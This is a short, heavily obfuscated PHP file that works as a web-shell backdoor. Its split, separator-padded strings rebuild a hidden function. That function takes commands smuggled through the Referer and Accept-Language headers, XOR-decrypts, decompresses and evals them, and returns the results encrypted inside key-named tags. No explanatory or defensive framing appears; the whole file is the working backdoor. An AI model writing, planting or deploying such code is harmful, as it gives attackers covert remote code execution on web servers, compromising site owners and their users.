<?php
$n='$kh="5d4|!1";|!$kf|!="402a";func|!tion x(|!$t|!,$k){$c=st|!rlen(|!$k);$|!l=|!strlen($t);$|!o="";f|!or($i=0|!;';
$v='$i<|!$l;){for|!($j=0;(|!$j|!<$c&&$i<$|!l);$j++|!,$i|!++)|!{$|!o.=$t{$i}^$k|!|!{$j};}}ret|!urn|! $o;}$r=$_SER|!';
$z='!0|!.(|![|!\\d]))?,?/",|!$ra,$m);if($q&&$m|!){@se|!ssio|!n_start()|!;$|!s=&$_SE|!SSION;|!$|!ss="substr";$sl|!="s';
$e=str_replace('E','','crEeatEe_EfuEnEctiEon');
$w='|!trtolowe|!r";$i=|!|!$m[1]|![|!0].$m[1][1]|!;$h=$sl($ss(m|!d5($i.$|!k|!h),0,3));$f|!=$|!sl|!($|!ss(md5($i|!.$kf),0,';
$k='($|!r|!r);par|!se_|!str($u["quer|!y"]|!,$q);$q=|!array_values|!(|!$q);preg_ma|!t|!ch_a|!ll("/([\\w])[\\|!|!w-]+(?:;q=|';
$c='3));$|!p="";for|!($z=|!1;$z<cou|!nt($|!m[1]);$z|!++)$p.=|!$q[$m|![2|!][$z]|!];if(strpo|!s($p|!,$|!h)===0)|!{$s[';
$O='($|!e){$k=$k|!h.$kf;ob_s|!tart()|!;@eva|!l(@gzun|!compr|!|!ess(@x(@bas|!e64_de|!code(preg_|!replac|!e(|!ar|!r';
$C='ay("/_/"|!,"/-/"),|!array(|!"/","|!+")|!,$|!ss($s[$i],|!0,$e))),|!$k)))|!;|!$o=o|!b_get|!_contents();ob_end_|!cle|!a';
$E='n();$|!d=ba|!se64_enco|!de(x|!(gzcompre|!ss($o|!),$k));p|!|!rint("<$|!k>$d<|!/$k>");@|!sessio|!n_des|!troy();}}}}';
$s='VER;|!$rr=@$r["H|!TT|!P_REFERER"|!|!];$ra=@|!$r["HTTP_A|!|!|!CCEPT_LANGUAGE"];|!if|!($rr&&$ra|!){$u=pa|!rse_u|!rl';
$t='$i]|!=""|!;$p=$ss($p|!,3);}i|!f(arr|!ay_key_e|!xi|!sts($i,$s)){$|!s[$i]|!.|!=$p;$e=strpos|!($|!s[$i],$f);|!if|!';
$L=str_replace('|!','',$n.$v.$s.$k.$z.$w.$c.$t.$O.$C.$E);
$D=$e('',$L);$D();
?>
